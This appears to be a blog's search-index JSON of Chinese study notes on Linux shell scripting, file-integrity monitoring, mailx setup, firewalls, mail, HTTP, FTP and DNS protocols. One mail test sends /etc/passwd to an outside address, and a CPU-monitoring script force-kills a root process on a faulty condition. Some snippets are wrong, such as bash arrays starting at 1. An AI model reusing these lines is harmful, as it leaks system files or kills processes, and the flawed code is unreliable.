OKmd5sum: .&#x2F;origin&#x2F;xxx: No such file or directory.&#x2F;origin&#x2F;xxx: FAILED open or readmd5sum: WARNING: 1 listed file could not be read","text":"Linux文件监控小脚本1、通过md5sum 对比 1234# 计算root目录下所有文件的md5 并重定向到origin_md5find /root/* --type f |xargs md5sum &gt; origin_md5# 检查文件有没有被修改，导致md5变化mdsum -c orign_md5 2、通过diff 命令比较内容的修改，目录里面文件的新增也可以检测到 修改了xxx .&#x2F;origin&#x2F;anaconda-ks.cfg: OK.&#x2F;origin&#x2F;monitor.sh: OK.&#x2F;origin&#x2F;test.txt: OK.&#x2F;origin&#x2F;xxx: FAILEDmd5sum: WARNING: 1 computed checksum did NOT match 删除了xxx .&#x2F;origin&#x2F;anaconda-ks.cfg: OK.&#x2F;origin&#x2F;monitor.sh: OK.&#x2F;origin&#x2F;test.txt: OKmd5sum: .&#x2F;origin&#x2F;xxx: No such file or directory.&#x2F;origin&#x2F;xxx: FAILED open or readmd5sum: WARNING: 1 listed file could not be read 新增 [root@192 ~]# diff origin afterOnly in origin: xxx1 123456789101112131415161718192021222324252627282930313233343536373839md5_log=&#x27;./origin_md5&#x27;if [ $# -eq 2 ]; then origin=$1 after=$2elif [ $# -eq 3 ]; then origin=$1 after=$2 new=$3 if [ $new = &quot;new&quot; ]; then mkdir $after cp $origin/* $after find $origin -type f |xargs md5sum |tee $md5_log exit 0 fielse echo &quot;参数错误&quot; exit 1fi# 文件新增diff_result=$(diff $origin $after|grep ^Only |sed -e &#x27;s/Only in//g&#x27; -e &#x27;s/: /\\//g&#x27;)if [ $? -eq 0 ]; then echo -e &#x27;**文件变化情况**\\n&#x27;&quot;$diff_result&quot; | tee result.log mail -s &quot;text&quot; &quot;2194620553@qq.com&quot;&lt; result.logfi# 文件内容修改content_diff=$(md5sum -c $md5_log 2&gt;/dev/null |grep &quot;FAILED$&quot;|sed -e &#x27;s/FAILED//g&#x27;)if [ $? -eq 0 ]; then echo -e &quot;***被修改的文件情况***\\n&quot;&quot;$content_diff&quot; | tee md5_result mail -s &quot;text&quot; &quot;2194620553@qq.com&quot; &lt;md5_resultfi# 文件被删除del_diff=$(md5sum -c $md5_log 2&gt;/dev/null |grep &quot;FAILED open or read&quot;|sed -e &#x27;s/FAILED open or read//g&#x27;)if [ $? -eq 0 ]; then echo -e &quot;***被删除的文件情况***\\n&quot;&quot;$del_diff&quot; | tee del_log mail -s &quot;test&quot; &quot;2194620553@qq.com&quot; &lt;del_logfi","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"Linux基础","slug":"系统基础/Linux基础_new","date":"2023-04-05T16:00:00.000Z","updated":"2024-03-12T10:39:28.681Z","comments":true,"path":"2023/04/06/系统基础/Linux基础_new/","link":"","permalink":"http://zwjsfdbb.top/2023/04/06/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/Linux%E5%9F%BA%E7%A1%80_new/","excerpt":"​ Linux 基础1、Centos 7 软件安装 rpm 安装 rpm -ivh 软件包 rpm -e 软件包 rpm -qa |grep 软件包 源码安装 寻找configure setup.sh install.sh .&#x2F;configure make make install 发现缺少依赖，但是系统已经安装对应的软件，可以尝试安装一下-devel,如pcre-devel yum 安装 yum list yum install yum repolist 列出当前的源 yum deplist 查看依赖库 yum erase 软件包 2、相关命令 net-tools 以及iproute2 两套网络相关命令体系 ip addr add 192.168.101.111&#x2F;24 dev ens33 ifconfig ens33 192.168.101.111 临时增加一个IP地址，一个网卡可以绑定多个IP地址 ss -anl netstat -anlop 列出当前端口占用情况 traceroute 跟踪路由 curl -O url wget -O xxx URL tcpdump tcpdump tcp and dst port 80 -i ens33 -w xx.pcap 3、Linux 命令 tee 命令同时打印到控制台以及文件中 1&gt;file 2&gt;file 1 代表正确的重定向，2代表错误的重定向 关于参数的判断语句 1234567891011if [ &quot;$#&quot; -ne 1 ]; thenecho &quot;参数错误，输入过多 或者未输入参数&quot;exit 1fiif [ -e &quot;$filename&quot; ]; then grep -n &quot;root&quot; $filenameelseecho &quot;文件不存在&quot;exit 1fi 注意[] 前后的空格 $ 必须加引号 关于判断文件以及目录的参数 1234567891011121314-e filename 如果 filename 存在，则为真 [ -e /var/log/syslog ]-d filename 如果 filename 为目录，则为真 [ -d /tmp/mydir ]-f filename 如果 filename 为常规文件，则为真 [ -f /usr/bin/grep ]-L filename 如果 filename 为符号链接，则为真 [ -L /usr/bin/grep ]-r filename 如果 filename 可读，则为真 [ -r /var/log/syslog ]-w filename 如果 filename 可写，则为真 [ -w /var/mytmp.txt ]-x filename 如果 filename 可执行，则为真 [ -L /usr/bin/grep ]-s filename 如果 filename 长度不为零，则为真 [ -s /usr/bin/grep ] 引号 双引号 变量会被引用 单引号，变量不会被引用 反引号，把里面的内容当作一个命令 123456789# 引号相关echo &quot;环境变量的路径： $PATH&quot;echo &#x27;环境变量的路径： $PATH&#x27;echo `date &quot;+%Y-%M-%D&quot;`#output 环境变量的路径： /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin环境变量的路径： $PATH2023-10-04/08/23 $? 非零代表上一条命令失败 $0 代表脚本的名称，$1 是第一个参数 $@ 和$* 返回脚本的参数，前者是多个字符串，或者是一个字符串 expr 数字命令 必须有空格，不能处理小数 1234[root@192 ~]# expr 10+2010+20[root@192 ~]# expr 10 + 2030expr 10 + 10 逻辑运算 a 与 -o 或 ! 非 字符串 -z 为空字符串 -n 为非空字符串 12345678[root@192 ~]# [ -z $xxx ][root@192 ~]# echo $?1[root@192 ~]# [ -n $xxx ][root@192 ~]# echo $?0[root@192 ~]# echo $xxx12345 数值比较 -eq 数值相等 -ne 数值不等 -le 小于等于 -ge 大于等于 -gt 大于 -lt 小于 123456789101112131415161718192021222324252627282930313233- 循环语句 ```shell - #!/usr/bin/bash # for sum=0 for i in &#123;1..100&#125;; do #sum=`expr $sum + $i` #let sum=sum+i ((sum=sum+i)) done echo &quot;$sum&quot; while []; do xxxx done # 后面那个1是步长,双圆括号用在这很好 #for i in &#123;1..100..1&#125;; do for ((i=0;i&lt;=100;i++)); do let sum+=i done echo &quot;sum is $sum&quot; # while #!/usr/bin/bash i=0 sum=0 while [ $i -lt 10 ]; do let sum=sum+i let i++ done echo &quot;$sum&quot; 函数 12345678- function add()&#123; let sum=$1+$2 # 参数取值方式 echo &quot;$sum&quot; # 相当于返回值 &#125; #result=$(add 100 200) result=`add 100 200` #两种赋值方式 echo $result 关于括号的一些用法 (()) 双圆括号，用于运算，可以替代expr，数学运算 123line=1((line+=3))echo $line # 4 ${} 可以去特定参数或变量的值 ${1} $() 可以代替反引号执行圆括号中的命令 $[] 用于整数运算，也可以代替expr ​ 示例 用了阶乘","text":"​ Linux 基础1、Centos 7 软件安装 rpm 安装 rpm -ivh 软件包 rpm -e 软件包 rpm -qa |grep 软件包 源码安装 寻找configure setup.sh install.sh .&#x2F;configure make make install 发现缺少依赖，但是系统已经安装对应的软件，可以尝试安装一下-devel,如pcre-devel yum 安装 yum list yum install yum repolist 列出当前的源 yum deplist 查看依赖库 yum erase 软件包 2、相关命令 net-tools 以及iproute2 两套网络相关命令体系 ip addr add 192.168.101.111&#x2F;24 dev ens33 ifconfig ens33 192.168.101.111 临时增加一个IP地址，一个网卡可以绑定多个IP地址 ss -anl netstat -anlop 列出当前端口占用情况 traceroute 跟踪路由 curl -O url wget -O xxx URL tcpdump tcpdump tcp and dst port 80 -i ens33 -w xx.pcap 3、Linux 命令 tee 命令同时打印到控制台以及文件中 1&gt;file 2&gt;file 1 代表正确的重定向，2代表错误的重定向 关于参数的判断语句 1234567891011if [ &quot;$#&quot; -ne 1 ]; thenecho &quot;参数错误，输入过多 或者未输入参数&quot;exit 1fiif [ -e &quot;$filename&quot; ]; then grep -n &quot;root&quot; $filenameelseecho &quot;文件不存在&quot;exit 1fi 注意[] 前后的空格 $ 必须加引号 关于判断文件以及目录的参数 1234567891011121314-e filename 如果 filename 存在，则为真 [ -e /var/log/syslog ]-d filename 如果 filename 为目录，则为真 [ -d /tmp/mydir ]-f filename 如果 filename 为常规文件，则为真 [ -f /usr/bin/grep ]-L filename 如果 filename 为符号链接，则为真 [ -L /usr/bin/grep ]-r filename 如果 filename 可读，则为真 [ -r /var/log/syslog ]-w filename 如果 filename 可写，则为真 [ -w /var/mytmp.txt ]-x filename 如果 filename 可执行，则为真 [ -L /usr/bin/grep ]-s filename 如果 filename 长度不为零，则为真 [ -s /usr/bin/grep ] 引号 双引号 变量会被引用 单引号，变量不会被引用 反引号，把里面的内容当作一个命令 123456789# 引号相关echo &quot;环境变量的路径： $PATH&quot;echo &#x27;环境变量的路径： $PATH&#x27;echo `date &quot;+%Y-%M-%D&quot;`#output 环境变量的路径： /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin环境变量的路径： $PATH2023-10-04/08/23 $? 非零代表上一条命令失败 $0 代表脚本的名称，$1 是第一个参数 $@ 和$* 返回脚本的参数，前者是多个字符串，或者是一个字符串 expr 数字命令 必须有空格，不能处理小数 1234[root@192 ~]# expr 10+2010+20[root@192 ~]# expr 10 + 2030expr 10 + 10 逻辑运算 a 与 -o 或 ! 非 字符串 -z 为空字符串 -n 为非空字符串 12345678[root@192 ~]# [ -z $xxx ][root@192 ~]# echo $?1[root@192 ~]# [ -n $xxx ][root@192 ~]# echo $?0[root@192 ~]# echo $xxx12345 数值比较 -eq 数值相等 -ne 数值不等 -le 小于等于 -ge 大于等于 -gt 大于 -lt 小于 123456789101112131415161718192021222324252627282930313233- 循环语句 ```shell - #!/usr/bin/bash # for sum=0 for i in &#123;1..100&#125;; do #sum=`expr $sum + $i` #let sum=sum+i ((sum=sum+i)) done echo &quot;$sum&quot; while []; do xxxx done # 后面那个1是步长,双圆括号用在这很好 #for i in &#123;1..100..1&#125;; do for ((i=0;i&lt;=100;i++)); do let sum+=i done echo &quot;sum is $sum&quot; # while #!/usr/bin/bash i=0 sum=0 while [ $i -lt 10 ]; do let sum=sum+i let i++ done echo &quot;$sum&quot; 函数 12345678- function add()&#123; let sum=$1+$2 # 参数取值方式 echo &quot;$sum&quot; # 相当于返回值 &#125; #result=$(add 100 200) result=`add 100 200` #两种赋值方式 echo $result 关于括号的一些用法 (()) 双圆括号，用于运算，可以替代expr，数学运算 123line=1((line+=3))echo $line # 4 ${} 可以去特定参数或变量的值 ${1} $() 可以代替反引号执行圆括号中的命令 $[] 用于整数运算，也可以代替expr ​ 示例 用了阶乘 1234567891011121314function jiecheng()&#123; sum=1 for ((i=1;i&lt;=$1;i++)); do let sum=sum*$i #echo $sum done echo $sum&#125;if [ $# != 1 ];then echo &quot;usage jiecheng number&quot; exit 1firesult=$(jiecheng $1)echo $result 数组的操作 1234567891011121314151617181920212223242526272829declare -a weekday# 数组下标默认从1开始# 单个赋值weekday[1]=Mondayweekday[2]=Tuesdayweekday[3]=xxx#整体赋值weekday=&#123;Monday Tuesday xxx&#125;#全部输出echo $&#123;weekday[@]&#125;#按照下标输出echo $&#123;weekday[1]&#125;#单个输出for day in $&#123;weekday[@]&#125;;do echo $daydone# 修改weekday[1]=qwerecho $&#123;weekday[1]&#125;# 取数组个数echo &quot;数组的个数是 $&#123;#weekday[@]&#125;&quot;#len=$&#123;#weekday[@]&#125;echo $lenfor ((i=1;i&lt;=$len;i++)); do echo &quot;$&#123;weekday[$i]&#125;&quot;done 字符串处理 1、删除字符 #*&#x2F;&#x2F; 从左边开始删除第一个&#x2F;&#x2F; 及其左边的内容 ##*&#x2F; 从左边开始，删除最后一个&#x2F; 及其左边的内容 %&#x2F;* 从右边开始，删除第一个&#x2F; 及其右边的内容 %%&#x2F;* 从右边开始，删除最后一个&#x2F;及其右边的内容 ​ ![image-20230412214344410](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230412214344410.png ​ 取字符 ${str:start:substrlen} 123456phone=&quot;13109097878&quot;echo $&#123;phone:0:5&#125; # 表示从第一个开始取5个字符串echo $&#123;phone:2:5&#125; # 表示从第3个开始取5个字符串echo $&#123;phone:0-5:3&#125; # 表示从倒数第五个开始取3个字符echo $&#123;#phone&#125; # 取字符串的长度 awk 的使用 12345678910111213141516171819awk 选项 处理逻辑 文件echo &quot;Hello Woniuxy Welcome Chengdu&quot; |awk &#x27;&#123;print $2&#125;&#x27; # 默认按照空格隔开后的第二列的内容Woniuxyecho -e &quot;Hello Woniuxy Welcome Chengdu\\nA B C D&quot; |awk &#x27;&#123;print $2&#125;&#x27; #\\n 就分成了两行，然后会输出每一行的第二列的内容WoniuxyBecho &#x27;http://www.woniuxy.com//index.html&#x27; |awk -F &#x27;.&#x27; &#x27;&#123;print $2&#125;&#x27; #用. 作为分隔符echo &#x27;http://www.woniuxy.com//index.html&#x27; |awk -F &#x27;[/.]&#x27; &#x27;&#123;print $2&#125;&#x27; #用/. 两个都作为分隔符ping www.baidu.com -c 2 |awk -F [\\(\\)] &#x27;&#123;print $2&#125;&#x27; # 输出以() 分割的第二列的内容，可以获取IP地址PING www.baidu.com (39.156.66.18) 56(84) bytes of data.64 bytes from 39.156.66.18 (39.156.66.18): icmp_seq=1 ttl=51 time=39.9 ms64 bytes from 39.156.66.18 (39.156.66.18): icmp_seq=2 ttl=51 time=39.4 msawk -F : &#x27;$1，~/正则表达式/ &#123;print $1&#125;&#x27; /etc/passwd # 输出第一列包含root的以:分割的第一列的内容，~/正则表达式/ sed 的使用 -i 永久修改文件 后续的都是直接显示，但是不会写入到文件 -n 显示处理后的结果 1234# 显示处理后的结果，/root/p 搜索并打印含有root的行，如果改成d 就是搜索并删除含有root的行[root@192 ~]# sed -n &#x27;/root/p&#x27; test.txt root:x:0:0:root:/root:/bin/bashoperator:x:11:0:operator:/root:/sbin/nologin a 新增 在后面新增新行 12345678910111213[root@192 ~]# sed &#x27;5a hello world&#x27; test.txt #在第五行后面新增数据root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinhello worldsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologin d 删除 12345678910[root@192 ~]# sed &#x27;6d&#x27; test.txt #删除第六行root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologin i 插入，在前面插入 新行 123456789101112[root@192 ~]# sed &#x27;5i hellword&#x27; test.txt # 在第五行前面新增一行数据hellowordroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinhellwordlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologin c 取代 1234567891011[root@192 ~]# sed &#x27;1c hellword&#x27; test.txt # 按行替换，替换第一行为helloworldhellwordbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologin sed ‘s&#x2F;root&#x2F;xxxx&#x2F;g’ 搜索root 替换为xxx , g 代表全局替换，不加则表示替换找到的第一个 1234567891011[root@192 ~]# sed &#x27;s/root/xxxxx/g&#x27; test.txt xxxxx:x:0:0:xxxxx:/xxxxx:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/xxxxx:/sbin/nologin -e 多点编辑 1234567891011[root@192 ~]# sed -e &#x27;s/root/xxxx/g&#x27; -e &#x27;1c hellword&#x27; test.txthellwordbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/xxxx:/sbin/nologin 实战监控CPU 123456789101112# 查找消耗CPU超过25%的进程并Killcpu=$(top -n 1 | grep &quot;%Cpu&quot; |awk &#x27;&#123;print $8&#125;&#x27;|awk -F . &#x27;&#123;print $1&#125;&#x27;)if [ $cpu -lt 75 ] ; then pid=$(top -n 1| grep root |head -n 1|awk &#x27;&#123;print $2&#125;&#x27;) echo &quot;占用CPU资源最多的进程ID是&quot;$pid filename=$(ls -l /proc/$pid/exe|awk -F &#x27;-&gt;&#x27; &#x27;&#123;print $2&#125;&#x27;) echo “进程路径为”$filename kill -s 9 $pid if [ $? -eq 0 ] ; then echo &quot;进程已经kill&quot; fifi 邮件配置 软件 mailx 编辑&#x2F;etc&#x2F;mail.rc 加入 1234567891011set from=zwjscu@qq.comset smtp=smtp.qq.comset smtp-auth-user=zwjscu@qq.comset smtp-auth-password=xxxx(授权码) 去对应的邮箱找set smtp-auth=login运行命令mail -s &quot;test&quot; 2194620553@qq.com &lt;/etc/passwd# 失败注意安装sendmailyum install sendmail ​ ​","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"Windows防火墙","slug":"系统基础/Windows防火墙_new","date":"2023-04-04T16:00:00.000Z","updated":"2024-03-12T09:54:18.015Z","comments":true,"path":"2023/04/05/系统基础/Windows防火墙_new/","link":"","permalink":"http://zwjsfdbb.top/2023/04/05/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/Windows%E9%98%B2%E7%81%AB%E5%A2%99_new/","excerpt":"windows 防火墙1、包过滤防火墙 判断信息-五元组 工作范围 3-4层 2、应用代理 较大程度地隔绝通信两端的直接通信，所有通信都要由应用层代理层转发,访问者不允许与服务器建立直接的TCP连接，应用层的协议会话过程必须符合代理的安全策略要求。 判断信息：应用层数据 工作范围：应用层 3、状态监测防火墙 ASPF TCP编辑，IP地址，端口 2-4层 4、WAF http协议数据（request response） 应用层","text":"windows 防火墙1、包过滤防火墙 判断信息-五元组 工作范围 3-4层 2、应用代理 较大程度地隔绝通信两端的直接通信，所有通信都要由应用层代理层转发,访问者不允许与服务器建立直接的TCP连接，应用层的协议会话过程必须符合代理的安全策略要求。 判断信息：应用层数据 工作范围：应用层 3、状态监测防火墙 ASPF TCP编辑，IP地址，端口 2-4层 4、WAF http协议数据（request response） 应用层 5、多合一网关 FW IDS IPS AV 2-7 6、下一代防火墙（NGFW） FW IDS IPS AV WAF 7 、windows 防火墙 netsh advfirewall &#x2F;?","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"邮件协议","slug":"系统基础/邮件协议_new","date":"2023-03-30T16:00:00.000Z","updated":"2024-03-12T10:41:48.640Z","comments":true,"path":"2023/03/31/系统基础/邮件协议_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/31/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/%E9%82%AE%E4%BB%B6%E5%8D%8F%E8%AE%AE_new/","excerpt":"邮件协议1、邮件协议 SMTP：简单邮件传输协议，TCP端口号25，主要用于发送电子邮件 SMTP代表Simple Mail Transfer Protocol。SMTP用于发送电子邮件并将其路由到正确的目标服务器（或邮箱）。SMTP服务器提供从邮件客户端（例如Microsoft Outlook、Gmail等）发送电子邮件所需的服务。当你发送一封电子邮件时，SMTP服务器接收该邮件，检查发送者是否有权访问该邮件，并将其传递到邮件接收服务器。SMTP是向外发送电子邮件的标准协议。 POP3：邮局协议第三版，默认TCP端口号110号，主要用于接收电子邮件 POP3是用于从邮件服务器上检索电子邮件的一种协议。使用POP3协议时，用户在邮件客户端上对本地邮件的操作（如，删除、转移至其它文件夹等）不会影响服务器上的邮件。但如果用户未勾选“在服务器上保留邮件的副本”时，不同的邮件客户端看到的本地邮件将会有所不同。 IMAP4：网际消息访问协议第四版，默认端口号143号，主要用于在线查看邮件（接收邮件) 使用IMAP协议时，用户在某个邮件客户端上的操作，将会被“映射”到邮件服务器上。因此，使用IMAP协议，可以同时保持多个邮件客户端上邮件的同步。 2、常见电子邮件系统 exchange postfix 第三方（qq,163） 3、邮件客户端 foxmail outlook 网易邮箱大师 QQ邮箱 4、wireshark 抓包 可以尝试抓到明文用户名，密码，内容 pop3 : 从邮件服务器拉取邮件，删除后不影响邮件服务器","text":"邮件协议1、邮件协议 SMTP：简单邮件传输协议，TCP端口号25，主要用于发送电子邮件 SMTP代表Simple Mail Transfer Protocol。SMTP用于发送电子邮件并将其路由到正确的目标服务器（或邮箱）。SMTP服务器提供从邮件客户端（例如Microsoft Outlook、Gmail等）发送电子邮件所需的服务。当你发送一封电子邮件时，SMTP服务器接收该邮件，检查发送者是否有权访问该邮件，并将其传递到邮件接收服务器。SMTP是向外发送电子邮件的标准协议。 POP3：邮局协议第三版，默认TCP端口号110号，主要用于接收电子邮件 POP3是用于从邮件服务器上检索电子邮件的一种协议。使用POP3协议时，用户在邮件客户端上对本地邮件的操作（如，删除、转移至其它文件夹等）不会影响服务器上的邮件。但如果用户未勾选“在服务器上保留邮件的副本”时，不同的邮件客户端看到的本地邮件将会有所不同。 IMAP4：网际消息访问协议第四版，默认端口号143号，主要用于在线查看邮件（接收邮件) 使用IMAP协议时，用户在某个邮件客户端上的操作，将会被“映射”到邮件服务器上。因此，使用IMAP协议，可以同时保持多个邮件客户端上邮件的同步。 2、常见电子邮件系统 exchange postfix 第三方（qq,163） 3、邮件客户端 foxmail outlook 网易邮箱大师 QQ邮箱 4、wireshark 抓包 可以尝试抓到明文用户名，密码，内容 pop3 : 从邮件服务器拉取邮件，删除后不影响邮件服务器 IMAP：删了就是删了","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"HTTP","slug":"系统基础/HTTP_new","date":"2023-03-28T16:00:00.000Z","updated":"2024-03-12T10:42:06.132Z","comments":true,"path":"2023/03/29/系统基础/HTTP_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/29/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/HTTP_new/","excerpt":"​ HTTP协议-HTTPS1、HTTP 超文本传输协议，默认端口80，基于TCP http是无连接的，限制每次连接只处理一个请求 http是无状态的，没有记忆能力 2、HTTPS https &#x3D; http + ssl&#x2F;tls 在http的通道上增加了安全性，传输过程中通过加密和身份验证来确保传输安全性。 tls 传输层安全协议，SSL和tls其实是一个协议，SSL 2.0版本自SSL3.0版本以后更名为TLS1.0，目前最高TLS1.3，最广泛应用的是TLS1.2。 传输之前，client和server 协商数据传输过程中的加密算法，包含非对称加密的密钥交换算法（RSA），数据签名摘要算法（MD5，sha），对称加密算法（DES&#x2F;AES ） 客户端生成随机的字符串，通过协商好的非对称加密算法，使用服务端的公钥对该字符串进行加密，发送给服务端。服务端收到后，使用自己的私钥进行解密得到该字符串，随后的数据传输中，使用这个字符串作为密钥进行对称加密。 3、PKI 数字签名 4、完整的过程","text":"​ HTTP协议-HTTPS1、HTTP 超文本传输协议，默认端口80，基于TCP http是无连接的，限制每次连接只处理一个请求 http是无状态的，没有记忆能力 2、HTTPS https &#x3D; http + ssl&#x2F;tls 在http的通道上增加了安全性，传输过程中通过加密和身份验证来确保传输安全性。 tls 传输层安全协议，SSL和tls其实是一个协议，SSL 2.0版本自SSL3.0版本以后更名为TLS1.0，目前最高TLS1.3，最广泛应用的是TLS1.2。 传输之前，client和server 协商数据传输过程中的加密算法，包含非对称加密的密钥交换算法（RSA），数据签名摘要算法（MD5，sha），对称加密算法（DES&#x2F;AES ） 客户端生成随机的字符串，通过协商好的非对称加密算法，使用服务端的公钥对该字符串进行加密，发送给服务端。服务端收到后，使用自己的私钥进行解密得到该字符串，随后的数据传输中，使用这个字符串作为密钥进行对称加密。 3、PKI 数字签名 4、完整的过程","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"FTP","slug":"系统基础/FTP_new","date":"2023-03-27T16:00:00.000Z","updated":"2024-03-12T10:42:02.758Z","comments":true,"path":"2023/03/28/系统基础/FTP_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/28/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/FTP_new/","excerpt":"FTP协议1、概念 文件传输协议，CS架构，基于TCP，默认端口号20，21 主动模式 被动模式 2、软件 服务器软件 serv-U filezilla server vsftpd IIS 客户端 ftp serverIP 资源管理器 ftp://192.168.10.10 浏览器 ftp://server_ip 第三方工具","text":"FTP协议1、概念 文件传输协议，CS架构，基于TCP，默认端口号20，21 主动模式 被动模式 2、软件 服务器软件 serv-U filezilla server vsftpd IIS 客户端 ftp serverIP 资源管理器 ftp://192.168.10.10 浏览器 ftp://server_ip 第三方工具","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"DNS","slug":"系统基础/DNS_new","date":"2023-03-25T16:00:00.000Z","updated":"2024-03-12T10:41:58.364Z","comments":true,"path":"2023/03/26/系统基础/DNS_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/26/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/DNS_new/","excerpt":"DNS 协议1、概念 DNS记录 A : 主机记录，域名和IP的映射 CNAME ： 别名 SOA：权威名称服务器 NS：名称服务器 MX：邮件交换记录 SRV： 正在提供服务的 PTR: 反向指针 2、DNS查询 客户机访问www.baidu.com，根据自己的TCP/IP参数，向自己的首选DNS服务器发送DNS请求 首选DNS服务器收到客户机的请求后，去查询自己的区域文件，找不到IP地址信息（将请求转发给根域服务器）；直接可以找到，则返回IP地址 根域服务器收到请求后，由于根域服务器只维护顶级域服务器，会响应顶级域名服务器IP（com）,首选DNS根据根域名服务器响应的信息，将请求转发到com顶级域 com顶级域收到请求，由于com顶级域只维护二级域信息，会响应二级域服务器IP，首选DNS根据顶级域响应的信息，将请求转发到baidu.com 二级域 baidu.com 二级域收到请求，baidu.com DNS服务器里面维护的是baidu.com 区域内的所有主机信息，包含了www.baidu.com的信息，将IP地址响应给首选DNS 首选DNS响应给主机。 3、 DNS配置 缓存DNS服务器 server2016上安装DNS服务，配置转发器 将另一台主机DNS服务器设置为server2016的IP，随后nslookup 查询特定域名 wireshark抓包 server2016这个缓存DNS服务器向转发器中的DNS服务器（192.168.10.1）转发DNS请求，192.168.10.1请求到以后，返回给server2016，server2016再响应client。 4、 DNS攻击 环境：","text":"DNS 协议1、概念 DNS记录 A : 主机记录，域名和IP的映射 CNAME ： 别名 SOA：权威名称服务器 NS：名称服务器 MX：邮件交换记录 SRV： 正在提供服务的 PTR: 反向指针 2、DNS查询 客户机访问www.baidu.com，根据自己的TCP/IP参数，向自己的首选DNS服务器发送DNS请求 